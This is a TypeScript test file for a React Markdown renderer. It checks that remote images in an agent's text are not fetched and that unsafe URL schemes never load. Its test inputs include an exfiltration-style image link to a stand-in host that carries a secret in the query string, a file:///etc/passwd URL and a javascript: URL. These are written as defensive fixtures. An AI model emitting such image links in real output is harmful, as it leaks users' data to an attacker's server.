import assert from "node:assert/strict";
import test from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { Markdown } from "./Markdown";

const html = (text: string) => renderToStaticMarkup(createElement(Markdown, { text }));

test("a remote image in an agent's text is not fetched: a placeholder names it and its host (security review 4b)", () => {
  const out = html("Here: ![the chart](https://evil.example/x.png?d=SECRET) and `//cdn.example/y.png`: ![y](//cdn.example/y.png)");
  assert.doesNotMatch(out, /<img/);
  assert.doesNotMatch(out, /SECRET/);
  assert.match(out, /the chart/);
  assert.match(out, /evil\.example/);
  assert.match(out, /cdn\.example/);
  assert.match(out, /Load image/);
});

test("a local path still renders as an image", () => {
  assert.match(html("![d](docs/d.png)"), /<img[^>]*src="docs\/d.png"/);
  // react-markdown drops a data: URL before the component sees it (as before): its alt text shows, nothing loads.
  const out = html("![dot](data:image/png;base64,iVBORw0KGgo=)");
  assert.doesNotMatch(out, /<img/);
  assert.match(out, /dot/);
});

test("other schemes never load", () => {
  const out = html("![x](file:///etc/passwd) ![y](javascript:alert(1))");
  assert.doesNotMatch(out, /<img/);
});
